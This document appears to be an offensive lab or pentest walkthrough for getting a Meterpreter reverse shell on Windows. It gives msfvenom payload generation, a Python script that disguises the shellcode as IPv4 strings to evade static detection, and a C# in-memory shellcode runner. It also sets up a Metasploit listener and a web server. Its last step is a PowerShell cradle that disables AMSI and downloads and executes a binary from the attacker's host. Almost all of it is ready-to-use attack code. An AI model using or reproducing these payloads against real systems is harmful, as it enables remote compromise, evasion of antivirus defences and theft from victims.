### 1. Payload Generation (Kali Mac)

Generate the raw x64 Meterpreter binary.

Bash

```
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.211 LPORT=4444 -f raw -o shell.bin
```
### 2. IPv4 Obfuscation Script (Python)

This breaks the binary signature into 4-byte IP address strings to evade static analysis.

Python

```
import sys

with open("shell.bin", "rb") as f:
    shellcode = f.read()

# Pad to multiple of 4
padding = 4 - (len(shellcode) % 4)
if padding < 4:
    shellcode += b"\x90" * padding

# Convert to IPs
print('string[] s = {')
for i in range(0, len(shellcode), 4):
    chunk = shellcode[i:i+4]
    print(f'    "{chunk[0]}.{chunk[1]}.{chunk[2]}.{chunk[3]}",')
print('};')
```
### 3. The C# IPv4 Shellcode Runner

**Project Type:** Console App (.NET Framework) | **Arch:** x64

C#

```
using System;
using System.Runtime.InteropServices;

namespace RevRunner {
    class Program {
        [DllImport("ntdll.dll")]
        static extern int RtlIpv4StringToAddressA(string S, bool Strict, out IntPtr L, IntPtr A);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
        
        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        static void Main(string[] args) {
            // PASTE PYTHON OUTPUT HERE
            string[] s = { "252.72.131.228", ... };

            IntPtr m = VirtualAlloc(IntPtr.Zero, (uint)(s.Length * 4), 0x3000, 0x40);
            IntPtr p = m;

            foreach (string i in s) {
                IntPtr d;
                RtlIpv4StringToAddressA(i, false, out d, p);
                p = (IntPtr)((long)p + 4);
            }

            CreateThread(IntPtr.Zero, 0, m, IntPtr.Zero, 0, IntPtr.Zero);
            System.Threading.Thread.Sleep(-1); 
        }
    }
}
```
### 4. Remote Hosting & Listener

**Kali Web Server:**
```
python3 -m http.server 80
```

**Metasploit Listener:**
```
msfconsole -q -x "use exploit/multi/handler; set payload windows/x64/meterpreter/reverse_tcp; set LHOST 192.168.45.211; set LPORT 4444; run"
```
### 5. The "Executioner" (One-Line Cradle)

Run this in the webshell console. It patches AMSI for the current session and executes the runner in memory.

PowerShell

```
powershell -ep bypass -c "$a=[Ref].Assembly.GetTypes();foreach($t in $a){if($t.Name -like '*iUtils'){$f=$t.GetField('amsiInitFailed','NonPublic,Static');$f.SetValue($null,$true)}}; $bytes=(New-Object System.Net.WebClient).DownloadData('http://192.168.45.211/Revshell.exe'); [System.Reflection.Assembly]::Load($bytes).EntryPoint.Invoke($null,@(,[string[]]@()))"
```